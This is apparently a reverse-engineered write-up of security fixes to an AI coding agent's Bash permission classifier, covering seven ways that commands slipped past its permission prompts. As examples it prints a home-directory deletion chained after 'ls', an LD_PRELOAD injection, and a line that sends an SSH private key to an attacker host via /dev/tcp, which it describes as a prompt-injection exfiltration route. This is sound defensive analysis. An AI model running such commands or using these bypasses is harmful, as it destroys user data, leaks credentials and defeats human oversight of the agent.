# Bash Permission Bypass Fixes — v2.1.97-98

**Theme:** A concentrated security pass closing seven distinct bypass classes in the Bash classifier and permission rule loader. Each fix addresses a specific shape of command that *should* have prompted but was being auto-allowed (or vice versa).

This is the largest security-focused pass in the v2.1.88 → v2.1.112 window. The pattern across all seven fixes: **the classifier was scoring the head of the parse but ignoring tails, escapes, or wrappers** that the shell *would* see at execution time. The fix in each case is to align the classifier's view of the command with the shell's view.

---

## 1. Backslash-Escaped Flag Bypass (v2.1.98)

### The vulnerability

```bash
git \-rm --force HEAD~
```

The shell parses `\-rm` as the argument string `-rm` (backslash escapes the dash, but the dash is regular text in argument position — the backslash is no-op). So this command runs `git -rm` (which `git` treats as a positional, then errors). But: a clever attacker constructed shapes the classifier saw as "flag-only" while the shell ran as a real subcommand.

The classifier was checking "is the arg flag-shaped?" (starts with `-`). A backslash-escaped flag failed the check (string starts with `\`, not `-`), so the classifier counted it as a *non-flag positional* — sometimes leading to the auto-allow path classifying the whole command as benign.

### The fix

The classifier's argument-shape check now respects backslash escaping in the same way the shell does: strip leading backslashes from the *first non-quoted character* before checking shape.

```javascript
// READABLE (conceptual, derived from bashPermissions.ts:524 stripSafeWrappers area)
function isFlagShape(arg) {
    const stripped = arg.replace(/^\\+/, "");  // drop leading backslashes
    return stripped.startsWith("-");
}
```

So `\-rm` strips to `-rm` → flag-shaped → counted as a flag → the auto-allow path only fires if **all args** are flags or known-safe. A real subcommand passed as a backslash-escaped string is no longer mis-categorized.

### Key insight

The shell removes backslash escapes during *word splitting*; the classifier was operating on the *raw token*. Aligning the two views is the fix. This pattern repeats throughout the bypass-class work: **classifier-view == shell-view, or you have a bypass.**

---

## 2. Compound Command Bypass (v2.1.98)

### The vulnerability

```bash
ls && rm -rf $HOME
```

In auto and bypass-permissions modes, compound commands (`&&`, `||`, `;`, `|`) were bypassing the *forced* permission prompts. The classifier scored the head (`ls`) and concluded "read-only → allow," letting the whole compound execute.

The shell, of course, runs both segments. `ls` succeeds → `rm -rf $HOME` runs.

### The fix

Each segment of a compound command is now independently classified. The decision is:
- All segments allow → allow.
- Any segment matches an `ask` rule → ask.
- Any segment matches a `deny` rule → deny.

```javascript
// READABLE (chunks.164.mjs:1735-1759 area — same loop iterates over split commands)
function checkCompound(command, rules) {
    const segments = splitCompoundCommand(command);  // splits on && || ; |
    let decision = "allow";
    let matchedRule = null;

    for (const seg of segments) {
        const segDecision = classifySegment(seg, rules);
        if (segDecision.behavior === "deny") return { behavior: "deny", rule: segDecision.rule };
        if (segDecision.behavior === "ask" && decision === "allow") {
            decision = "ask";
            matchedRule = segDecision.rule;
        }
    }
    return { behavior: decision, rule: matchedRule };
}
```

The chunks.164.mjs:1739-1759 wildcard-rule loop runs *per segment* (variable `J` iterates the split-command set `O`) — and each rule type (prefix, exact, wildcard) gets checked against each segment.

### Key insight

A compound is a **conjunction of actions**, not a single action. The classifier's decision must reflect that. The pre-v2.1.98 code treated compounds as a single action with `ls` as the representative — a category error.

### Edge case: `cd <project> && <command>`

Project-prefix patterns like `cd ~/myproject && git status` are *very* common idioms. Treating them as "compound, prompt" would cause prompt-fatigue.

The v2.1.111 follow-up adds a specific carve-out: when the inner command is itself safe and the `cd` target is the project directory (or an additional-directory), the compound is allowed without prompt (see v2.1.111 §10). The compound check still runs; the carve-out fires after the segments are individually classified.

The trade-off: `cd /etc && rm -rf *` is still classified by the inner command, which would prompt or deny. The allowlist applies only when the inner is itself safe.

---

## 3. Env-Var Prefix Bypass (v2.1.97-98)

### The vulnerability

```bash
LD_PRELOAD=/tmp/evil.so git status
```

The classifier saw `git status` after stripping the env-var prefix and concluded "read-only → allow." But `LD_PRELOAD` would load arbitrary code into `git`'s process — arbitrary code execution.

Pre-v2.1.97, *any* `NAME=value` prefix was being stripped before classification, treating the wrapper as semantically transparent.

### The fix

A safe-env-var allowlist `N98` of 37 vars known to **never** affect process behavior dangerously:

```javascript
// ============================================
// safeEnvVars - allowlist for env-var prefix stripping
// Location: chunks.164.mjs:1718
// ============================================

// ORIGINAL (for source lookup):
N98 = new Set([
    "GOEXPERIMENT", "GOOS", "GOARCH", "CGO_ENABLED", "GO111MODULE",
    "RUST_BACKTRACE", "RUST_LOG",
    "NODE_ENV", "PYTHONUNBUFFERED", "PYTHONDONTWRITEBYTECODE",
    "PYTEST_DISABLE_PLUGIN_AUTOLOAD", "PYTEST_DEBUG",
    "ANTHROPIC_API_KEY",
    "LANG", "LANGUAGE", "LC_ALL", "LC_CTYPE", "LC_TIME", "CHARSET",
    "TERM", "COLORTERM", "NO_COLOR", "FORCE_COLOR",
    "TZ", "LS_COLORS", "LSCOLORS", "GREP_COLOR", "GREP_COLORS", "GCC_COLORS",
    "TIME_STYLE", "BLOCK_SIZE", "BLOCKSIZE", "COLUMNS", "LINES",
    "CLICOLOR", "CLICOLOR_FORCE",
    "CI", "DEBIAN_FRONTEND", "GIT_TERMINAL_PROMPT"
]);

// Mapping: N98→safeEnvVars
```

A command's env-var prefix is only stripped if **every** assignment uses a name in `N98`. Unknown var prefixes prompt.

### Why these 37 vars

The set is curated. Each is:
- A language/runtime tweak that doesn't add code execution (no `LD_*`, `DYLD_*`, no `*PATH`).
- A formatting/locale knob (color, time formatting, charset).
- A CI/automation signal (`CI`, `DEBIAN_FRONTEND`).
- `ANTHROPIC_API_KEY` — already-managed credential (the user knows they're passing it).

Notably absent:
- `PATH` and `*_PATH` (could redirect lookups)
- `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES` (code injection)
- `HOME`, `USER`, `TMPDIR` (could redirect file writes)
- Custom app config vars (unknown semantics)

### The two-stage strip mechanism

The classifier's wrapper-stripping (`stripSafeWrappers` at `bashPermissions.ts:524`) handles three categories together:
1. **Env-var prefixes** — `NAME=value` → strip if NAME in `N98`
2. **Safe binaries** — `sudo`, `doas`, `env`, `xargs`, `nice`, `stdbuf`, `nohup`, `timeout`, `time`, `pkexec` (the `PkY` set at chunks.164.mjs:1716)
3. **Shell wrappers** — `sh -c "..."`, `bash -c "..."`, etc.

After stripping, what's left is the **inner command** that gets classified. If any wrapper isn't in the safe list, stripping stops at that wrapper — and the unstripped command shapes the classification.

### Key insight

Wrappers are **either safe** (don't change semantics) **or hostile** (do change semantics). There's no middle ground for the classifier. The fix is to default to "hostile" (prompt) unless the wrapper is on the allowlist. **Default-deny is safer than default-allow** for code-execution surfaces.

---

## 4. `/dev/tcp` Redirect Bypass (v2.1.98)

### The vulnerability

```bash
cat ~/.ssh/id_rsa > /dev/tcp/attacker.com/4444
```

Bash's `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` are virtual paths the shell interprets — they don't open files; they open TCP/UDP sockets. The destination receives the redirected output.

Pre-v2.1.98, redirect classification looked at the *target path* — `/dev/tcp/...` is a path, the classifier treated it as a local-file write target. Local file writes go through the path-safety check; depending on the user's working directory, that path might pass the safety check ("not in a protected dir, not in `.git`, ok to write").

Result: an attacker (via prompt injection) could exfiltrate any file Claude can read.

### The fix

Detect `/dev/tcp/` and `/dev/udp/` prefixes specifically and **always** prompt regardless of mode:

```javascript
// READABLE (conceptual)
function checkRedirectTarget(path) {
    if (path.startsWith("/dev/tcp/") || path.startsWith("/dev/udp/")) {
        return {
            behavior: "ask",
            message: "Bash redirect to network socket — confirm before proceeding",
            decisionReason: { type: "dangerousRedirect" }
        };
    }
    // ... usual path safety check
}
```

The DNS-cache commands (`getent`, `nslookup`, `host`) were also removed from auto-allow lists in v2.1.97 as part of the same "no covert network channels" theme.

### Key insight

The shell interprets some paths as **special-case syscalls**, not file opens. The classifier must enumerate these special cases. Currently `tcp` and `udp` are the only Linux bash specials; macOS bash supports `/dev/fd/N` and `/dev/stdin/stdout/stderr` (all benign).

If future Bash versions add new specials (e.g., a hypothetical `/dev/exec/...`), the classifier would need updating — this is a non-extensible enumeration, not a general rule.

---

## 5. Wildcard Rule Whitespace Tolerance (v2.1.98)

### The bug

Permission rules with wildcards like `Bash(git diff *)` were failing to match user input with **extra whitespace**:

```
Rule:     Bash(git diff *)
Command:  git\tdiff foo     ← tab between words, not space
Result:   no match → prompt
```

The wildcard implementation in `src/utils/permissions/shellRuleMatching.ts:81` was doing direct character matching: a `' '` in the rule had to match a `' '` in the input. Tabs, multiple spaces, and other whitespace failed.

### The fix

Normalize whitespace before matching: collapse runs of whitespace to a single space on both sides, then compare.

```javascript
// READABLE (conceptual)
function normalizeWhitespace(s) {
    return s.replace(/\s+/g, " ").trim();
}

function matchWildcard(pattern, command) {
    const np = normalizeWhitespace(pattern);
    const nc = normalizeWhitespace(command);
    return wildcardRegex(np).test(nc);
}
```

After normalization, `git\tdiff foo` → `git diff foo` → matches `git diff *`.

### Why not normalize earlier in the pipeline?

The original command must be preserved for execution (the shell's tokenization may matter — e.g., quoted whitespace in arguments is meaningful). Normalization is only for *rule matching*, not for command execution.

### Key insight

Rule patterns and commands are both *human-written*, with informal whitespace. Pattern-matching on raw whitespace counts as a usability bug — the user wrote the rule one way, the model produced the command another way, and both meant the same thing.

This is **whitespace insensitivity for matching, preservation for execution**. The same pattern appears in the JS prototype fix (§6): use a normalized key for lookup, but preserve the original for inspection.

---

## 6. JS Prototype-Property Rule Names (v2.1.97)

### The bug

A permission rule named `toString`, `hasOwnProperty`, `valueOf`, or any other `Object.prototype` member caused `settings.json` to be silently ignored at parse time.

```json
{
  "permissions": {
    "allow": {
      "Bash(toString)": "anyValue"
    }
  }
}
```

When the loader did `ruleRegistry[ruleName] = value` and later `ruleRegistry[someRuleName]`, accessing `toString` returned **`Object.prototype.toString`** (a function) instead of the stored value. This poisoned the registry, and downstream code treated the rule registry as malformed → silently rejected the entire settings file.

### The fix

Use `Object.create(null)` for the rule registry, removing the prototype chain:

```javascript
// ============================================
// rule registry - prototype-safe
// Location: chunks.* (rule loader)
// ============================================

const ruleRegistry = Object.create(null);  // no prototype chain

// Now: ruleRegistry["toString"] === undefined (no inheritance)
ruleRegistry["toString"] = userValue;
// And: ruleRegistry["toString"] === userValue (lookup works)
```

### Why this matters specifically for Claude Code

User-controlled object keys flow through the settings loader: rule names (`Bash(...)`), tool names (mostly safe — but MCP server prefixes flow through), settings keys (`permissions`, `hooks`, etc.).

The bug existed because some of these registries were created with `{}` (a `Object.prototype` instance) and never tested with attacker-controlled keys.

The v2.1.97 fix was localized — the rule registry. A broader audit (in subsequent versions) addressed parallel cases in:
- PowerShell command lookup (`src/tools/PowerShellTool/readOnlyValidation.ts:130` — uses `Object.create(null)`)
- PowerShell parser cache (`src/utils/powershell/parser.ts:1327`)
- Object groupBy helper (`src/utils/objectGroupBy.ts:8`)

### Key insight

JavaScript objects are **dictionaries with leaks**. For any data structure with attacker-controlled keys, `Object.create(null)` (or `Map`) is the correct primitive. `{}` is a footgun.

The bug here is silent — the settings load doesn't crash, it just returns no rules. A user who set a rule named `constructor` in their settings would see Claude Code ignore their entire permissions block with no error message.

A subtle UX bug becomes a security bug: an attacker who can write to the user's settings (via a malicious plugin, an open-redirect in cloud sync, etc.) could disable *all* permission rules by adding a single innocent-looking entry.

---

## 7. Permission-Rule Tightening Summary

The v2.1.97-98 bash hardening pass landed three more small fixes that share the theme:

### `grep -f FILE` reading outside cwd (v2.1.98)

`grep -f patterns.txt` reads patterns from `patterns.txt`. If `patterns.txt` is outside cwd, the user might not have granted read access to that path. Classifier now prompts on `-f` with an absolute path outside cwd.

### Deny-rule downgrade on piped commands (v2.1.98)

Piped commands mixing `cd` and other segments were downgrading deny rules to prompts because the deny check fell through to "ask" when the segment composition was unusual. Now deny wins regardless of composition.

### False-positive cleanup

`cut -d /`, `paste -d /`, `column -s /`, `awk '{print $1}' file`, filenames containing `%` were all triggering false-positive prompts. The fixes are mostly to the *parser* (the `/` after `-d` is the delimiter, not a path).

These cleanup fixes are the **counterpart** to the hardening: every tightening of the classifier risks new false positives, so the team ships hardening and cleanup together.

---

## 8. The Pattern Across All Seven Bypasses

| Bypass | What the classifier missed | Fix |
|--------|---------------------------|-----|
| Backslash flag | Shell semantics of `\-` | Strip backslashes pre-shape-check |
| Compound | Multi-action semantics of `&&`/`\|\|`/`;` | Score each segment |
| Env-var prefix | Some env vars are code-execution surfaces | Allowlist of safe vars only |
| `/dev/tcp` redirect | Shell virtual paths != file paths | Special-case enumeration |
| Wildcard whitespace | Pattern vs command whitespace normalization | Normalize before matching |
| Prototype property | Object key collisions with `Object.prototype` | `Object.create(null)` |
| `grep -f` outside cwd | Read-file flag with path semantics | Re-check the `-f` target |

Each fix is small. Each fix is independent. The **combined effect** is that the Bash classifier transitions from "best-effort heuristic" to "first-class security boundary" — the team treats it with the same rigor as the deny rules themselves.

---

## File-level "where to look"

| Concern | 2.1.112 chunk | v2.1.88 baseline |
|---------|---------------|------------------|
| `stripSafeWrappers` | `chunks.83.mjs`, `chunks.149.mjs`, `chunks.164.mjs` | `src/tools/BashTool/bashPermissions.ts:524` |
| `safeEnvVars` allowlist (`N98`) | `chunks.164.mjs:1718` | `src/tools/BashTool/bashPermissions.ts` (search "safe-list") |
| `safeBinaries` (`PkY`) | `chunks.164.mjs:1716` | same file |
| Compound classification loop | `chunks.164.mjs:1722-1759` (`kkY`) | `src/tools/BashTool/bashPermissions.ts:1735+` |
| Wildcard matching | `chunks.164.mjs` wildcard branch | `src/utils/permissions/shellRuleMatching.ts:81-150` |
| Bash semantics check | `chunks.164.mjs` checkSemantics | `src/tools/BashTool/bashPermissions.ts:1774-1793` |
| `Object.create(null)` registries | `chunks.*` (parser caches) | `src/utils/permissions/permissionsLoader.ts` (rule loader) |
| `getBashPromptAllowDescriptions` (uses registry) | `chunks.164.mjs:1471-1473` | `src/tools/BashTool/bashClassifier.ts` |

---

## Related Symbols

> Symbol mappings:
> - [`symbol_additions_unit_12.md`](../00_overview/symbol_additions_unit_12.md) — Unit 12 additions
> - [`symbol_index_infra_platform.md`](../00_overview/symbol_index_infra_platform.md) — Existing platform/permission symbols

Key functions and constants in this document:
- `stripSafeWrappers` — Iteratively strips `NAME=value`, `sudo`, `env`, etc., from a command
- `safeEnvVars` (`N98`) — 37-element set of env vars that are safe in command prefixes
- `safeBinaries` (`PkY`) — Set of safe wrapper binaries (`sudo`, `nohup`, `timeout`, etc.)
- `checkSemantics` — Catches `eval`, `exec`, zsh builtins after parse
- `splitCompoundCommand` — Splits on `&&`, `||`, `;`, `|`, redirects
- `matchingRuleForInput` — Checks if a rule allows/denies an input
- `wildcardRegex` — Converts wildcard pattern to RegExp
- `tryParseShellCommand` — Legacy `shell-quote` parse path
- `checkPathSafetyForAutoEdit` — Path-safety check for file writes
- `Object.create(null)` — Prototype-safe object primitive used in rule registry
